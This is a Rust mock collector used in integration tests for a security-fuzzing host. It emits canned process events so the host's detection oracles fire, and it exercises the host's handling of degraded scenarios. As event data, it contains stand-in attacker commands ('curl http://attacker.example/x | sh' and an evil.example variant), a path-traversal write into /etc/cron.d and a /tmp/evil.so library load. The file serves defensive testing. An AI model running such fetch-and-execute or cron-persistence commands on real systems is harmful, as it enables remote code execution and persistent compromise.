// SPDX-License-Identifier: Apache-2.0

//! Mock runtime-event collector sidecar (#60/#76), used only by the Linux CLI
//! integration tests.
//!
//! It speaks the real `bhf.collector-event.v1` JSONL protocol and the #76 replay
//! handshake: it signals readiness (`BHF_COLLECTOR_READY`), waits for the host to
//! launch the retained target under it and hand off that target's REAL pid
//! (`BHF_COLLECTOR_TARGET_PID`), waits for the host to signal the replay is done
//! (`BHF_COLLECTOR_DONE`), then emits a canned observation ROOTED AT THE HANDED-OFF
//! PID (so the host's "evidence is about the launched process" invariant holds),
//! and writes the JSONL to `BHF_COLLECTOR_LOG`. A real provider would instead
//! observe the live process; the wire contract and handshake the host drives are
//! identical, which is what this exercises on a Linux runner with no OS tracer.
//!
//! The canned scenario is selected by `BHF_MOCK_SCENARIO`. Several scenarios
//! deliberately misbehave to exercise the host's bounded, degraded (not-observed)
//! routing: `no_ready`, `capture_failed`, `unobserved`, and `hang`.

use std::path::Path;
use std::time::{Duration, Instant};

use runtime_collector::schema::{CollectorEvent, EventKind, EventPhase, Fidelity, ProcessIdentity};

/// One canned effect the replayed target "performs" while observed.
struct Effect {
    kind: EventKind,
    path: Option<String>,
    args: Vec<String>,
    verb: Option<String>,
    input_derived: bool,
    taint_offset: Option<u32>,
    ts_offset: f64,
}

/// A fuzz-controlled shell execution (fires the controlled-process oracle).
fn controlled_exec() -> Effect {
    Effect {
        kind: EventKind::ShellExecute,
        path: Some("/bin/sh".into()),
        args: vec!["-c".into(), "curl http://attacker.example/x | sh".into()],
        verb: Some("exec".into()),
        input_derived: true,
        taint_offset: Some(0),
        ts_offset: 1.0,
    }
}

/// A fuzz-controlled path escaping the allowed root (fires the path oracle).
fn controlled_write() -> Effect {
    Effect {
        kind: EventKind::FileWrite,
        path: Some("../../etc/cron.d/payload".into()),
        args: Vec::new(),
        verb: None,
        input_derived: true,
        taint_offset: Some(4),
        ts_offset: 2.0,
    }
}

/// A fuzz-controlled dynamic-library load (fires the module-load oracle).
fn controlled_load() -> Effect {
    Effect {
        kind: EventKind::ModuleLoad,
        path: Some("/tmp/evil.so".into()),
        args: Vec::new(),
        verb: None,
        input_derived: true,
        taint_offset: Some(8),
        ts_offset: 3.0,
    }
}

/// The three positive classes in one observation.
fn positive_all() -> Vec<Effect> {
    vec![controlled_exec(), controlled_write(), controlled_load()]
}

/// Fixed constants the target always performs (never fuzz-controlled): must never
/// be taint-confirmed.
fn fixed_constants() -> Vec<Effect> {
    vec![
        Effect {
            kind: EventKind::ShellExecute,
            path: Some("/bin/ls".into()),
            args: vec!["-la".into()],
            verb: Some("exec".into()),
            input_derived: false,
            taint_offset: None,
            ts_offset: 1.0,
        },
        Effect {
            kind: EventKind::FileWrite,
            path: Some("data/output.bin".into()),
            args: Vec::new(),
            verb: None,
            input_derived: false,
            taint_offset: None,
            ts_offset: 2.0,
        },
        Effect {
            kind: EventKind::ModuleLoad,
            path: Some("/usr/lib/x86_64-linux-gnu/libc.so.6".into()),
            args: Vec::new(),
            verb: None,
            input_derived: false,
            taint_offset: None,
            ts_offset: 3.0,
        },
    ]
}

fn effects_for(scenario: &str) -> Vec<Effect> {
    match scenario {
        "process_exec" => vec![controlled_exec()],
        "fixed_constants" => fixed_constants(),
        // positive effects plus a degraded fidelity signal (handled below).
        "lossy" | "unrelated_excluded" => positive_all(),
        _ => positive_all(),
    }
}

fn fidelity_for(scenario: &str) -> Fidelity {
    if scenario == "lossy" {
        Fidelity {
            lost: 3,
            permission_denied: true,
            unsupported_fields: vec!["process.token".into()],
        }
    } else {
        Fidelity::default()
    }
}

/// Render the begin/effect/end JSONL for `root_pid` (the replayed target's real
/// pid). Effects are performed by a descendant of `root_pid` (so they attribute to
/// its tree); the `unrelated_excluded` scenario adds an out-of-tree process's event
/// that the host must exclude.
fn render(testcase: &str, worker: u32, root_pid: u32, root_image: &str, scenario: &str) -> String {
    let child_pid = root_pid.checked_add(1).unwrap_or(root_pid);
    let start_ts = 1_000.0;
    let mut events: Vec<CollectorEvent> = Vec::new();
    let mut seq = 0u64;

    let mut begin = CollectorEvent::new(
        testcase,
        worker,
        seq,
        EventPhase::Begin,
        EventKind::ProcessCreate,
    );
    begin.process = ProcessIdentity {
        pid: root_pid,
        image: Some(root_image.to_owned()),
        session: Some(1),
        ..Default::default()
    };
    begin.ts = Some(start_ts);
    events.push(begin);

    for effect in effects_for(scenario) {
        seq += 1;
        let mut ev = CollectorEvent::new(testcase, worker, seq, EventPhase::Event, effect.kind);
        ev.process = ProcessIdentity {
            pid: child_pid,
            parent: Some(root_pid),
            ancestor: Some(root_pid),
            session: Some(1),
            ..Default::default()
        };
        ev.path = effect.path;
        ev.args = effect.args;
        ev.verb = effect.verb;
        ev.input_derived = effect.input_derived;
        ev.taint_offset = effect.taint_offset;
        ev.ts = Some(start_ts + effect.ts_offset);
        events.push(ev);
    }

    if scenario == "unrelated_excluded" {
        // A concurrent, UNRELATED process (not in the replayed target's tree): the
        // host must exclude it from attribution and findings.
        seq += 1;
        let mut ev = CollectorEvent::new(
            testcase,
            worker,
            seq,
            EventPhase::Event,
            EventKind::ShellExecute,
        );
        ev.process = ProcessIdentity {
            pid: 7777,
            parent: Some(6666),
            ancestor: Some(6666),
            session: Some(1),
            ..Default::default()
        };
        ev.path = Some("/bin/sh".into());
        ev.verb = Some("exec".into());
        ev.args = vec!["-c".into(), "curl http://evil.example/y | sh".into()];
        ev.input_derived = true;
        ev.taint_offset = Some(0);
        ev.ts = Some(start_ts + 1.5);
        events.push(ev);
    }

    seq += 1;
    let mut end = CollectorEvent::new(
        testcase,
        worker,
        seq,
        EventPhase::End,
        EventKind::ProcessCreate,
    );
    end.process = ProcessIdentity {
        pid: root_pid,
        ..Default::default()
    };
    end.ts = Some(start_ts + 10.0);
    end.fidelity = fidelity_for(scenario);
    events.push(end);

    let mut jsonl = String::new();
    for ev in &events {
        jsonl.push_str(&ev.to_jsonl_line());
        jsonl.push('\n');
    }
    jsonl
}

fn env_u32(key: &str, default: u32) -> u32 {
    std::env::var(key)
        .ok()
        .and_then(|v| v.parse().ok())
        .unwrap_or(default)
}

/// Signal the #76 readiness ack so the host launches the replay target under us.
fn signal_ready() {
    if let Ok(path) = std::env::var("BHF_COLLECTOR_READY") {
        if !path.is_empty() {
            let _ = std::fs::write(&path, b"ready");
        }
    }
}

/// Wait (bounded) for the host to hand off the launched target's real pid.
fn read_handoff_pid(deadline: Instant) -> Option<u32> {
    let path = std::env::var("BHF_COLLECTOR_TARGET_PID").ok()?;
    if path.is_empty() {
        return None;
    }
    let path = Path::new(&path);
    while Instant::now() < deadline {
        if let Ok(s) = std::fs::read_to_string(path) {
            if let Ok(pid) = s.trim().parse::<u32>() {
                return Some(pid);
            }
        }
        std::thread::sleep(Duration::from_millis(10));
    }
    None
}

/// Wait (bounded) for the host's replay-done signal.
fn wait_for_done(deadline: Instant) {
    let Ok(path) = std::env::var("BHF_COLLECTOR_DONE") else {
        return;
    };
    if path.is_empty() {
        return;
    }
    let path = Path::new(&path);
    while Instant::now() < deadline {
        if path.exists() {
            return;
        }
        std::thread::sleep(Duration::from_millis(10));
    }
}

fn write_sink(jsonl: &str) {
    match std::env::var("BHF_COLLECTOR_LOG") {
        Ok(path) if !path.is_empty() => {
            if let Err(e) = std::fs::write(&path, jsonl.as_bytes()) {
                eprintln!("mock_collector: failed to write sink {path}: {e}");
                std::process::exit(1);
            }
        }
        _ => print!("{jsonl}"),
    }
}

fn main() {
    let testcase = std::env::var("BHF_COLLECTOR_TESTCASE").unwrap_or_else(|_| "tc-0".to_owned());
    let worker = env_u32("BHF_COLLECTOR_WORKER", 0);
    let root_image = std::env::var("BHF_COLLECTOR_ROOT_IMAGE")
        .unwrap_or_else(|_| "/srv/sandbox/target".to_owned());
    let scenario = std::env::var("BHF_MOCK_SCENARIO").unwrap_or_else(|_| "positive_all".to_owned());

    // #76 degraded-routing scenarios exercise the host's bounded not-observed path.
    match scenario.as_str() {
        // Never ack readiness, then exit: the host must detect the missing ack.
        "no_ready" => std::process::exit(0),
        // Ack readiness, then fail the capture (non-zero exit, no sink).
        "capture_failed" => {
            signal_ready();
            std::process::exit(7);
        }
        _ => {}
    }

    signal_ready();

    // The replayed target's real pid, handed off after the host launches it under
    // us. A real tracer would instead observe this pid directly.
    let pid_deadline = Instant::now() + Duration::from_secs(10);
    let root_pid = read_handoff_pid(pid_deadline);

    // Hold until the host signals the replay finished (bounded), as a real
    // observation window would span the target's execution.
    wait_for_done(Instant::now() + Duration::from_secs(10));

    match scenario.as_str() {
        // Ack + run, but observe NOTHING for the testcase: the host must treat this
        // as not-observed, never a clean assurance.
        "unobserved" => {
            write_sink("");
        }
        // Ack, take the handoff, then wedge forever: the host must bound the drain
        // and record a not-observed (timeout) run rather than hang.
        "hang" => loop {
            std::thread::sleep(Duration::from_secs(3600));
        },
        _ => {
            // Root the canned observation at the real launched pid so it is genuinely
            // "about" the replayed process (the host enforces this).
            let root_pid = root_pid.unwrap_or(0);
            let jsonl = render(&testcase, worker, root_pid, &root_image, &scenario);
            write_sink(&jsonl);
        }
    }
}
